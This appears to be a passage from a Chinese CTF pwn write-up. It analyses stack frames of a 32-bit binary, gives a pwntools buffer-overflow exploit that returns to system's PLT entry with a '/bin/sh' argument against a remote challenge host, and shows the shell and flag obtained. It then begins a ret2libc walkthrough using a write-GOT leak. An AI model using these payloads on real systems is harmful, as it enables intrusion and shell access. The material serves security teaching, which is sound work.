<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048566-push-ebx-ebx压栈被调用者保存寄存器">4.<code>.text:08048566                 push    ebx          ;ebx压栈,被调用者保存寄存器</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-00000008                 db ? ; undefined		;ebx被调用者保存位置</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined		;ebx结束</span><br><span class="line"></span><br><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048567-sub-esp-30h-为局部变量开30h字节的栈空间">5.<code>.text:08048567                 sub     esp, 30h     ;为局部变量开30h字节的栈空间</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">-00000038                 db ? ; undefined		;从ebp-39到ebp-9为局部变量栈帧</span><br><span class="line">...</span><br><span class="line">-00000026 s               dw ?</span><br><span class="line">-00000024                 db ? ; undefined</span><br><span class="line">-00000023                 db ? ; undefined</span><br><span class="line">-00000022                 db ? ; undefined</span><br><span class="line">-00000021                 db ? ; undefined</span><br><span class="line">-00000020                 db ? ; undefined</span><br><span class="line">-0000001F                 db ? ; undefined</span><br><span class="line">-0000001E                 db ? ; undefined</span><br><span class="line">-0000001D                 db ? ; undefined</span><br><span class="line">-0000001C                 db ? ; undefined</span><br><span class="line">-0000001B                 db ? ; undefined</span><br><span class="line">-0000001A                 db ? ; undefined</span><br><span class="line">-00000019                 db ? ; undefined</span><br><span class="line">-00000018                 db ? ; undefined</span><br><span class="line">-00000017                 db ? ; undefined</span><br><span class="line">-00000016                 db ? ; undefined</span><br><span class="line">-00000015                 db ? ; undefined</span><br><span class="line">-00000014                 db ? ; undefined</span><br><span class="line">-00000013                 db ? ; undefined</span><br><span class="line">-00000012                 db ? ; undefined</span><br><span class="line">-00000011                 db ? ; undefined</span><br><span class="line">-00000010                 db ? ; undefined</span><br><span class="line">-0000000F                 db ? ; undefined</span><br><span class="line">-0000000E                 db ? ; undefined</span><br><span class="line">-0000000D                 db ? ; undefined</span><br><span class="line">-0000000C                 db ? ; undefined</span><br><span class="line">-0000000B                 db ? ; undefined</span><br><span class="line">-0000000A                 db ? ; undefined</span><br><span class="line">-00000009                 db ? ; undefined		;从ebp-39到ebp-9为局部变量栈帧</span><br><span class="line"></span><br><span class="line">-00000008                 db ? ; undefined		;ebx被调用者保存位置</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined		;ebx结束</span><br><span class="line"></span><br><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h5 id="尾声">尾声</h5>
<h6
id="text080485fd-add-esp-30h-开端时也是sub-esp30h-这是局部变量的空间溢出成任意字符填空">1.<code>.text:080485FD                 add     esp, 30h     ;开端时也是sub esp,30h 这是局部变量的空间,溢出成任意字符填空</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-00000008                 db ? ; undefined		;ebx被调用者保存位置</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined		;ebx结束</span><br><span class="line"></span><br><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048600-pop-ebx-被调用者保存寄存器ebx">2.<code>.text:08048600                 pop     ebx          ;被调用者保存寄存器,ebx</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-00000004                 db ? ; undefined		;esi被调用者保存位置</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined		;esi结束</span><br><span class="line"></span><br><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048601-pop-esi-栈顶指针">3.<code>.text:08048601                 pop     esi          ;栈顶指针</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00000000  s              db 4 dup(?)			;帧指针esp位置</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048602-pop-ebp-然后是调用者函数ebp的保存值我们给他溢出成任意字符填空">4.<code>.text:08048602                 pop     ebp          ;然后是调用者函数ebp的保存值,我们给他溢出成任意字符填空</code></h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<h6
id="text08048603-retn-此处retn-会将我们溢出的返回值放到rip">5.<code>.text:08048603                 retn                 ;此处retn 会将我们溢出的返回值放到rip</code></h6>
<p>此时栈顶为main调用call
hello之前的栈顶,和hello函数一点关系都没有了</p>
</blockquote>
<p>s有38个字节,接下来四个字节是调用者函数ebp帧指针的保存值,接下来四个字节就是返回值,<strong>接下来还有四个字节,没用</strong></p>
<blockquote>
<p>注意最后这四个没用的字节<span
class="math inline">\([ebp+5,ebp+8]\)</span>,也要溢出给他填了,然后再填<code>/bin/sh</code>的地址,</p>
<p>如果溢出修改r之后不填四字节的空,紧接着写<code>/bin/sh</code>的地址,接下来函数尾声会干啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">;main调用hello</span><br><span class="line">.text:0804864C                 call    hello		;call指令会将返回值0x08048651压栈,占用4字节空间</span><br><span class="line">.text:08048651                 mov     dword ptr [esp], offset aThankYou ; &quot;thank you&quot;</span><br><span class="line">;开端</span><br><span class="line">.text:08048562                 push    ebp			;ebp压栈,占用4字节</span><br><span class="line">.text:08048563                 mov     ebp, esp		;ebp获得当前esp快照,指向当前函数的栈底</span><br><span class="line">.text:08048565                 push    esi			;esi压栈,被调用者保存寄存器</span><br><span class="line">.text:08048566                 push    ebx			;ebx压栈,被调用者保存寄存器</span><br><span class="line">.text:08048567                 sub     esp, 30h		;为局部变量开30h字节的栈空间</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;尾声</span><br><span class="line">.text:080485FD                 add     esp, 30h		;开端时也是sub esp,30h 这是局部变量的空间,溢出成任意字符填空</span><br><span class="line">.text:08048600                 pop     ebx			;被调用者保存寄存器,ebx</span><br><span class="line">.text:08048601                 pop     esi			;栈顶指针</span><br><span class="line">.text:08048602                 pop     ebp			;然后是调用者函数ebp的保存值,我们给他溢出成任意字符填空</span><br><span class="line">.text:08048603                 retn					;此处retn 会将我们溢出的返回值放到rip,然后退掉这个返回值占用的栈空间,</span><br></pre></td></tr></table></figure>
<p>那么hello函数退栈<strong>刚好将/bin/sh的地址退掉,相当于写了填空了,白写</strong>,此时栈顶是main函数调用hello函数之前的栈顶</p>
</blockquote>
<p>综上栈缓冲区溢出就应该前38+4个字节乱写凑数,</p>
<p>然后返回值写<code>0x0804855A</code></p>
<blockquote>
<p>返回值这里应该写啥也要注意</p>
<p>首先pwn函数里面调用system有一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0804855A                 call    _system</span><br></pre></td></tr></table></figure>
<p>然后双击该位置有一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048420                 jmp     ds:off_804A01C</span><br><span class="line">.plt:08048420 _system         endp</span><br><span class="line">.plt:08048420</span><br></pre></td></tr></table></figure>
<p>然后再双击<code>off_804A01C</code>又有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A01C off_804A01C     dd offset system        ; DATA XREF: _system↑r</span><br></pre></td></tr></table></figure>
<p>那么溢出的返回值到底是写<code>0x0804855A</code>,还是写<code>0x08048420</code>,还是写<code>0x0804A01C</code>?</p>
<p>实验证明,只有写<code>0x08048420</code>才可以getshell,为什么其他两个不行呢?</p>
<p>对于<code>0x0804855A</code>返回该地址后,紧接着执行的是<code>call    _system</code>,这条指令不光会将程序计数器RIP改成system的地址,还会将返回值压栈,这个压栈就坏了大事,我们费劲千辛万苦把栈顶调成name的地址,现在被返回值又给盖住了,那么调用system函数之后栈顶自然不是<code>/bin/sh</code>的地址,因此不能getshell</p>
<p><code>0x08048420</code>这里只有一个jmp无条件跳转,不会改变栈顶</p>
<p>对于<code>0x0804A01C</code>,相当于省去了前面jmp
的内容,但是却不能成功,目前原因不知道,可能和GOT和PLT有关,但也只是瞎猜的,以后学了这两个东西再说</p>
</blockquote>
<p>然后一个双字写一个字符串"<code>/bin/sh</code>"的地址,但是使用String视图并没有找到这么一个字符串,</p>
<p>因此需要我们自己写一个,写到什么地方呢?</p>
<p>刚才还有一个输入姓名,既然可以输入,说明它不在rodata节,实际上在bss节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080 name            db 34h dup(?)           ; DATA XREF: hello+77↑o</span><br></pre></td></tr></table></figure>
<p>也就是说,在刚才输入姓名的时候,可以直接明目张胆地把<code>/bin/sh</code>写入<code>name</code></p>
<p>然后在溢出时返回值后面写<code>0x0804A080</code>即bss上name的首地址</p>
<h3 id="exp-4">exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&#x27;./cgpwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;60172&#x27;</span>);</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;please tell me your name&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;hello,you can leave some message here:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">42</span>+p32(<span class="number">0x8048420</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+<span class="string">&#x27;AAAA&#x27;</span>+p32(<span class="number">0x804A080</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">cgpwn2</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">cyberpeace&#123;53ac82665087a94d761a1eb18a0c2991&#125;</span><br></pre></td></tr></table></figure>
<h2
id="level3ret2libcprintf格式化字符串漏洞">006level3(ret2libc,printf格式化字符串漏洞)</h2>
<p>给了两个文件,一个level3,一个libc_32.so.6,后面这个是libc的动态库文件</p>
<h3 id="收集信息">收集信息</h3>
<p>对level3checksec</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]</span><br><span class="line">└─# checksec level3</span><br><span class="line">[*] &#x27;/mnt/c/Users/86135/Desktop/pwn/level3/level3&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>运行一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]</span><br><span class="line">└─# ./level3</span><br><span class="line">Input:</span><br><span class="line">/bin/sh</span><br><span class="line">Hello, World!</span><br></pre></td></tr></table></figure>
<p>打印"Input:",获取输入,打印"Hello,World"</p>
<h3 id="反汇编分析-1">反汇编分析</h3>
<p>ida打开level3直接看伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();<span class="comment">//关键函数</span></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);<span class="comment">//不存在溢出漏洞</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);	<span class="comment">//0x100=256字节&gt;136存在缓冲区溢出漏洞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处存在缓冲区溢出漏洞,观察<code>vulnernable_function</code>的栈帧,溢出可以修改函数返回地址,甚至继续溢出可以把main的栈帧都毁掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-00000088 buf             db 136 dup(?)</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>但是观察Strings视图,并没有<code>/bin/sh</code>这种字符串</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220529150450668.png"
alt="image-20220529150450668" />
<figcaption aria-hidden="true">image-20220529150450668</figcaption>
</figure>
<p>functions视图也没有System函数</p>
<p>那么怎么才能获取shell呢?</p>
<p>libc库中有system和<code>/bin/sh</code>字符串</p>
<p><code>glibc-2.9/system.c</code>中<code>#define SHELL_PATH "/bin/sh"  /* Path of the shell.  */</code></p>
<p><code>glibc-2.9/system.c</code>中有<code>static int do_system (const char *line)</code>的实现</p>
<blockquote>
<p>为啥libc中要有<code>/bin/sh</code>字符串呢?</p>
<p>因为<code>system()</code>函数就是调用的shell程序,libc当然要知道该程序在哪里,最常用的shell就是<code>/bin/sh</code></p>
</blockquote>
<p>在本题中可以使用各种方法获得<code>/bin/sh</code>字符串和<code>system</code>函数在<code>libc_32.so.6</code>中的位置</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]└─# strings -at x libc_32.so.6|grep /bin/sh   </span><br><span class="line"> 15902b /bin/sh</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]</span><br><span class="line">└─# ROPgadget --binary libc_32.so.6 --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0015902b : /bin/sh</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]</span><br><span class="line">└─# readelf -s libc_32.so.6|grep system       </span><br><span class="line">  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>现在获取到的地址是库函数在<code>libc</code>库中的位置,并不是库函数实际运行时的地址.然而给一个库文件也不是一无是处,</p>
<p>位置无关代码的特性是,库的在进程虚拟地址空间中的位置可以变,但是<strong>库中成员之间的相对地址不会变</strong></p>
<blockquote>
<p>这就好比现在每个库函数是058班上的一个同学,每个同学都有一个班内编号,从1到40.</p>
<p>在058班中不管怎么问4号同学是谁,总会获得回答sjf.</p>
<p>然后整个班一起考试的时候,考数据结构时被安排到A220考场,考C++的时候被安排到B304考场...</p>
<p>但是整个班总是安排在同一间教室</p>
<p>在考数据结构的时候去A220问4号学生是谁,必是sjf</p>
<p>但是当考C++的时候还去A220问4号学生是谁,必然不是sjf</p>
<p>我现在知道sjf是他们班四号,并且抓住了一个他们班的学生,怎么知道sjf具体在哪一个考场,哪一个座位呢?</p>
<p>跟着这个学生前往他的考场,假设这个学生是5号则前面一个学生就是4号的sjf.</p>
</blockquote>
<p>在本题中,我们要找的函数就是<code>system</code>,顺带还要找一个字符串<code>/bin/sh</code>,在库中的地址已经知道了,并且我们已经逮住了一个<strong>库中的函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br></pre></td></tr></table></figure>
<p>他在libc库中的位置:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2323: 000d43c0   101 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>那么其他libc中的函数或者变量相对于write的位置</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>write</th>
<th>system</th>
<th>/bin/sh</th>
</tr>
</thead>
<tbody>
<tr>
<td>libc中的位置</td>
<td><code>0xd43c0</code></td>
<td><code>0x3a940</code></td>
<td><code>15902b</code></td>
</tr>
<tr>
<td>相对于write的位置</td>
<td><code>0</code></td>
<td><code>-0x99a80</code></td>
<td><code>-0x11e6eb</code></td>
</tr>
</tbody>
</table>
<p>使用栈缓冲区溢出写好参数然后返回到<code>write</code>被调用前,让<code>write</code>打印出它自己的地址</p>
<p>怎么返回到<code>write</code>前呢?</p>
<p>1.由于程序没有开启PIE保护,因此<strong>本程序内(不包括libc动态库)的各个函数地址是常数</strong></p>
<blockquote>
<p>注意共享库libc可以加载到本程序的"任何地方"</p>
<p>这里任何地方指的是</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603144111550.png"
alt="image-20220603144111550" />
<figcaption aria-hidden="true">image-20220603144111550</figcaption>
</figure>
<p>用户栈和堆之间</p>
<p>共享库并不能挤再读写段和只读代码段之间</p>
<p>相当于再用户栈和运行时堆之间有一块很大的空间,共享库只能在这片空间中挑一个利索的地方加载</p>
<p>这就好比在一艘航母上只能在甲板上放置舰载机,不能将舰载机放在舰桥上</p>
<p>由于这片巨大的空间在程序运行开始时就已经决定了,并且每次运行都是一样大的,当没有开启PIE保护时,总是从虚拟地址空间的0x400000开始加载,因此本程序内各函数,各数据的地址都是定值.</p>
<p>至于调用libc库中的函数,则使用got+plt表,对于本模块内的函数只需要将控制交给plt表,plt表相当于一个本程序与动态库的接口.</p>
<p>plt和got表就像人的嘴一样,可以随便吃东西但是归根接底长到人的脸上</p>
</blockquote>
<p>2.使用PLT表返回到<code>write</code>的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+<span class="string">b&#x27;0000&#x27;</span>+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>plt是text节开始时的一个跳转表,text节的位置不变,plt表的位置也不会变</p>
<p>前面<code>0x8c</code>都写0,是为了溢出<code>buf</code>和<code>s</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-00000088 buf             db 136 dup(?)</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br></pre></td></tr></table></figure>
<p>然后四个字节就是返回地址<code>p32(elf.plt['write'])</code></p>
<blockquote>
<p>这个<code>elf.plt['write']</code>是啥呢?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;write&#x27;</span>]))</span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level3]</span><br><span class="line">└─# python3 exp.py</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/86135/Desktop/pwn/level3/level3&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">0x8048340</span><br></pre></td></tr></table></figure>
<p>用ida打开后跳转到该地址<code>0x8048340</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048340</span><br><span class="line">.plt:08048340 ; ssize_t write(int fd, const void *buf, size_t n)</span><br><span class="line">.plt:08048340 _write          proc near               ; CODE XREF: vulnerable_function+15↓p</span><br><span class="line">.plt:08048340                                         ; main+22↓p</span><br><span class="line">.plt:08048340</span><br><span class="line">.plt:08048340 fd              = dword ptr  4</span><br><span class="line">.plt:08048340 buf             = dword ptr  8</span><br><span class="line">.plt:08048340 n               = dword ptr  0Ch</span><br><span class="line">.plt:08048340</span><br><span class="line">.plt:08048340                 jmp     ds:off_804A018</span><br><span class="line">.plt:08048340 _write          endp</span><br><span class="line">.plt:08048340</span><br></pre></td></tr></table></figure>
<p>​
<code>0x8048340</code>正好就是<code>write</code>在plt表中的起始位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;0&#x27;</span>*<span class="number">0x8c</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+<span class="string">b&#x27;0000&#x27;</span>+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
